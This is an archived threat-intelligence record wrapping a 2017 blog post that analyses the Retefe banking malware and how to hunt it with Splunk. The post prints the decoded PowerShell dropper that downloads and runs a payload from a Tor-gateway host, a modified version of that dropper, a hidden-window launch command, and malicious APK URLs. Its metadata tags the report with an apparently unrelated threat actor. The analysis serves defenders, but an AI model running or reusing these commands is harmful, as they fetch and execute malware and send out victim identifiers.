{
    "id": "10e53d1d-d346-4e2a-ba3a-2539be941ca5",
    "created_at": "2023-01-12T14:59:15.875149Z",
    "updated_at": "2025-03-27T02:06:15.60733Z",
    "deleted_at": null,
    "sha1_hash": "5c81b713f87c7d65fbb4fe4cab3ce18427ef0c37",
    "title": "2017-02-24 - Hunting Retefe with Splunk - some interesting points",
    "authors": "",
    "file_creation_date": "2022-05-27T18:59:10Z",
    "file_modification_date": "2022-05-27T18:59:10Z",
    "file_size": 644119,
    "plain_text": "# Hunting Retefe with Splunk - some interesting points\n\n**blog.angelalonso.es/2017/02/hunting-retefe-with-splunk-some24.html**\n\nWhile I was creating some Splunk use cases to detect malware (together with Sysmon) I was doing some test with\nmalware Refete which I wrote quite a bit in this blog about it.\n\nThere are a couple of things I found interested to share\n\nThe initial vector of infection is through Malspam with a fake bill in a DOCX file which contains some malicious\ncode. However, this time the malicious code is PowerShell, instead of JS (more info in\n[http://blog.angelalonso.es/2016/10/malicious-email-campaign-against-swiss.html)](http://blog.angelalonso.es/2016/10/malicious-email-campaign-against-swiss.html))\n\nThis can be spotted straight forward in Splunk.\n```\npowershell -EncodedCommand\n\"JABGAD0AJABlAG4AdgA6AFQAZQBtAHAAKwAnAFwAUgBCAFgAcgAxAGwAawA5AFAALgBqAHMAJwA7ACgATgBlAHcALQBPAGIAagBlAGMAdA\n\n```\nThe command decoded, which acts as a dropper, is the following:\n\n\n-----\n\n```\n  $F=$env:Temp+'\\RBXr1lk9P.js';\n  (New-Object System.Net.WebClient).DownloadFile('https://ele6idfdqwdr6m2w.onion.to/RBXr1lk9P.js?ip='+\n  (New-Object System.Net.WebClient).DownloadString('http://api.ipify.org/')+'&id='+((wmic path\n  win32_logicaldisk get volumeserialnumber)[2]).trim().toLower(),$F);(New-Object -com\n  Shell.Application).ShellExecute($F);\n\n```\nBasically, it requests a file located in a Tor node (which is the payload) through the onion.to\nwebsite: https://ele6idfdqwdr6m2w.onion.to/RBXr1lk9P.js?ip=\n\nTo request the file, it is necessary to send the IP of the victim as parameter and the logical number of the disk. To do\nso, there are 2 things happening:\n\n1) request to http://api.ipify.org/ in order to get the public IP of the victim\n\n2) run the command ((wmic path win32_logicaldisk get volumeserialnumber)[2]) to extract the serial number of the\nlogical disk.\n\nIf the IP is not from some specific countries or the serial number is empty the payload downloaded is empty as well,\nhence nothing happens. Actually, in some cases the parameter \"2\", doesn't work, and needs to be different. For,\nexample this command will work in some VirtualMachines (just need to put an IP from Switzerland in the w.x.y.z)\n\n$F=$env:Temp+'\\RBXr1lk9P.js';(New-Object\nSystem.Net.WebClient).DownloadFile('https://ele6idfdqwdr6m2w.onion.to/RBXr1lk9P.js?ip=w.x.y.z&id='+((wmic path\nwin32_logicaldisk get volumeserialnumber)[4]).trim().toLower(),$F);(New-Object -com\nShell.Application).ShellExecute($F)\n\nClearly, they are using the logical number for tracking purposes\n\nOnce the script is pulled the whole execution happens. Some JS code is executed, some additional tools are\ndecompressed and execute (Tor and Proxifier), the browser processes are killed, etc.\n\nHowever, a couple of new 'features' have been introduced since my last posts:\n\n[http://blog.angelalonso.es/2016/10/malicious-email-campaign-against-swiss.html](http://blog.angelalonso.es/2016/10/malicious-email-campaign-against-swiss.html)\n\n[http://blog.angelalonso.es/2016/10/malicious-email-campaign-mimicking.html](http://blog.angelalonso.es/2016/10/malicious-email-campaign-mimicking.html)\n\nFirst of all is the way that the Proxifier tool is launched, as the window now is hidden. This is done with the\nPowerShell command:\n\n\n-----\n\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"$t='[DllImport(\\\"user32.dll\\\")] public static extern\nbool ShowWindow(int handle, int state);';add-type -name w -member $t -namespace n;saps -FilePath\n\\\"Proxifier\\\";while(!\n\n[n.w]::ShowWindow(([System.Diagnostics.Process]::GetProcessesByName(\\\"proxifier\\\")|gps).MainWindowHandle,0))\n{}\"\n\n\nSecond, the Proxifier is configured to not be shown in the windows system Icon on the bottom left part of the\ndesktop.\n\nAfter that, the victim's traffic towards the banks is redirect to Tor. In order to steal the TAN SMS token, it is\nnecessary to install a malicious APK, however here there are some changes as well:\n\n\n-----\n\nNow the APK resides in a domain with a valid SSL certificate and the APK can be dowloaded by HTTPS. Before,\nthis was not the case and the traffic was only HTTP\n\nNote that the certificate has been registered a few days ago and the expiration date is 2 months\n\nMoreover, if the victim is not a real victim, the link to download the APK is not the malicious APK, but the real 'Signal\nPrivate Messenger\" tool, hence the victim's phone doesn't get infected. Some examples of the URL for different\nbanks:\n\nhttps://mobile-sicherheitapp.com/ZKB-Security-v19-02.apk\nhttps://mobile-sicherheitapp.com/CreditSuisse-Security_v1902.apk\n\nhttps://mobile-sicherheitapp.com/Raiffeisenc-Security-v_19-02.apk\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-24 - Hunting Retefe with Splunk - some interesting points.pdf"
    ],
    "report_names": [
        "2017-02-24 - Hunting Retefe with Splunk - some interesting points.pdf"
    ],
    "threat_actors": [
        {
            "id": "4fe925e8-95e5-4a63-9f96-4d0f9bedac08",
            "created_at": "2022-10-25T15:50:23.469077Z",
            "updated_at": "2025-03-27T02:00:55.478056Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "DarkHydrus"
            ],
            "source_name": "MITRE:DarkHydrus",
            "tools": [
                "Mimikatz",
                "RogueRobin",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6efb28db-4d91-46cb-8ab7-fe9e8449ccfc",
            "created_at": "2023-01-06T13:46:38.772861Z",
            "updated_at": "2025-03-27T02:00:02.914846Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "Obscure Serpens",
                "LazyMeerkat",
                "G0079"
            ],
            "source_name": "MISPGALAXY:DarkHydrus",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5b04780e-7b64-4e62-b776-c6749ff7dec8",
            "created_at": "2022-10-25T16:07:23.531741Z",
            "updated_at": "2025-03-27T02:02:09.84903Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "ATK 77",
                "DarkHydrus",
                "LazyMeerkat",
                "Obscure Serpens"
            ],
            "source_name": "ETDA:DarkHydrus",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Mimikatz",
                "Phishery",
                "RogueRobin",
                "RogueRobinNET",
                "Trojan.Phisherly",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535555,
    "ts_updated_at": 1743041175,
    "ts_creation_date": 1653677950,
    "ts_modification_date": 1653677950,
    "files": {
        "pdf": "https://archive.orkl.eu/5c81b713f87c7d65fbb4fe4cab3ce18427ef0c37.pdf",
        "text": "https://archive.orkl.eu/5c81b713f87c7d65fbb4fe4cab3ce18427ef0c37.txt",
        "img": "https://archive.orkl.eu/5c81b713f87c7d65fbb4fe4cab3ce18427ef0c37.jpg"
    }
}